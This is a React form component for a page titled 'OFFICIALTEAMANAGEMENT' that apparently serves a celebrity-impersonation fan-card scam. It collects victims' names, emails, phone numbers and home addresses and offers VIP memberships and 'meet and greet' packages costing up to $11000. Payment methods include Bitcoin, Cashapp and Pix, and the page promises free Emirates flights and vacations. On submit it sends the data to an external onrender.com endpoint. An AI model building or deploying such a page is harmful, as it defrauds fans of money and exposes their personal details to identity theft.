import React, {useState} from 'react'
import "./LoginForm.css"
import Axios from "axios"
import {useNavigate} from "react-router-dom"
import GoogleT from "./GoogleT"


const LoginForm = () => {
  const nav = useNavigate()
  const[name, setName] = useState()
  const[email, setEmail] = useState()
  const[phoneNumber, setPhoneNumber] = useState()
  const[payment, setPayment] = useState()
  // const[vvip, setVvip] = useState()
  // const[vip, setVip] = useState()
  // const[regular, setRegular] = useState()
  // const[week1, setWeek1] = useState()
  // const[week2, setWeek2] = useState()
  const[homeAddress, setHomeAddress] = useState()
  const[paymentMethods, setPaymentMethods] = useState()
  const[err, setError] = useState()
  // const[payPal, setPayPal] = useState()
  // const[cashapp, setCashapp] = useState()
  // const[bitcoin, setBitcoin] = useState()
  // const[etransfer, setEtransfer] = useState()
  // const[pixpayment, setPixPayment] = useState()
  // const[policy, setPolicy] = useState()

  const handelName = (e) => {
    const newName = e.target.value
    setName(newName)
  }
  const handelEmail = (e) => {
    const newEmail = e.target.value
    setEmail(newEmail)
  }
  const handelPhoneNumber = (e) => {
    const newPhoneNumber = e.target.value
    setPhoneNumber(newPhoneNumber)
  }
  const handelPayment = (e) => {
    const newPayment = e.target.value
    setPayment(newPayment)
  }
  const handelHomeAddress = (e) => {
    const newHomeAddress = e.target.value
    setHomeAddress(newHomeAddress)
  }
  const handelPaymentMethods = (e) => {
    const newPaymentMethods = e.target.value
    setPaymentMethods(newPaymentMethods)
  }

  const url ="https://official-fppk.onrender.com/api/mysand"
  const data = {name, email, phoneNumber, payment, paymentMethods, homeAddress}

  const postData = (e)=>{
    e.preventDefault()
     if(!name || !email || !phoneNumber || !payment || !paymentMethods ||!homeAddress){
        setError("You can not leave any Field Empty")
     }else{
      nav("/successful")
      Axios.post(url, data)
      .then(res=>{
        console.log(res)
      })
      .catch((err)=>{
        console.log(err)
      })
     }
  }

  console.log(data)

  return (
    <section className="Container">
        <header>
            <h1>OFFICIALTEAMANAGEMENT</h1>
        </header>
        <GoogleT/>
        <section className="InputBox">
            <form className="InputBoxDiv">
                <label>Name <span className="Eroo">*</span></label>
                <input type="text" placeholder="Your Answer" className="InputText" onChange={handelName}/>
                <label>Email <span className="Eroo">*</span></label>
                <input type="email" placeholder="Your Answer" className="InputText" onChange={handelEmail}/>
                <label>Phone number <span className="Eroo">*</span></label>
                <input type="text" placeholder="Your Answer" className="InputText" onChange={handelPhoneNumber}/>

                    <div className="InputCheck">
                      <div className="BigCheck">
                        <input type="checkbox" name="" id="phone"  value="Vvip"  onChange={handelPayment}/>
                        <label>Vvip = $1550</label>
                      </div>
                      <div className="BigCheck">
                        <input type="checkbox" name="" id="checkPrice" value="vip" onChange={handelPayment}/>
                        <label>Vip = $1050</label>
                      </div>
                      <div className="BigCheck">
                        <input type="checkbox" name="" id="checkPrice"  value="Regular" onChange={handelPayment}/>
                        <label>Regular = $550</label>
                      </div>
                      <div className="BigCheck">
                        <input type="checkbox" name="" id="checkPrice"  value="1week" onChange={handelPayment} />
                        <label>Meet and greet 1week = $5000</label>
                      </div>
                      <div className="BigCheck">
                        <input type="checkbox" name="" id="checkPrice"  value="2weeks" onChange={handelPayment}/>
                        <label>Meet and greet 2weeks =  $11000</label>
                      </div>
                    </div>

                <label>Home address <span className="Eroo">*</span></label>
                <input type="text" placeholder="Your Answer" className="InputText address" onChange={handelHomeAddress} />

                <div className="InputCheck">
                    <h2 className="Pay"> payment methods?</h2>
                    <div className="BigCheck">
                      <input type="checkbox" name="" id="Checkpayment" value="Bank transfer"  onChange={handelPaymentMethods}/>
                      <label>Bank transfer</label>
                    </div>
                    <div className="BigCheck">
                      <input type="checkbox" name="" id="Checkpayment" value="PayPal" onChange={handelPaymentMethods}/>
                      <label>PayPal</label>
                    </div>
                    <div className="BigCheck">
                      <input type="checkbox" name="" id="Checkpayment" value="Cashapp" onChange={handelPaymentMethods}/>
                      <label>Cashapp</label>
                    </div>
                    <div className="BigCheck">
                      <input type="checkbox" name="" id="Checkpayment" value="Bitcoin" onChange={handelPaymentMethods}/>
                      <label>Bitcoin</label>
                    </div>
                    <div className="BigCheck">
                      <input type="checkbox" name="" id="Checkpayment" value="E-transfer" onChange={handelPaymentMethods}/>
                      <label>E-transfer</label>
                    </div>
                    <div className="BigCheck">
                      <input type="checkbox" name="" id="Checkpayment" value="Pix payment" onChange={handelPaymentMethods}/>
                      <label>Pix payment</label>
                    </div>
                  </div>

                  <div className="Footer">
                        <h4>BENEFITS OF A VIP FAN MEMBERSHIP CARD HOLDER </h4>
                        <span>Benefactor become an ambassador to me</span>
                        <p>Benefactor gets a free flight expense with emirate airline and accommodation to explore 4 countries of choice for vacation with me and my team.</p>

                  </div>

                  <div className="InputCheck">
                    <div className="BigCheck">
                        <label>Do you agree with our policy..?</label>
                        <input type="checkbox" name="" id="Checkpolicy" style={{marginLeft:"10px"}} />
                    </div>
                  </div>

                  <p style={{marginTop: "-3%", marginLeft: "2%", color: "red", fontSize: "12px"}}>{err}</p>
                  <div className="BtnDiv">
                    <button className="Btn" onClick={(e)=>postData(e)}>Submit</button>
                    <button type="reset" className="BtnClear">Clear form</button>
                  </div>
            </form>
        </section>
    </section>

    
)
}

export default LoginForm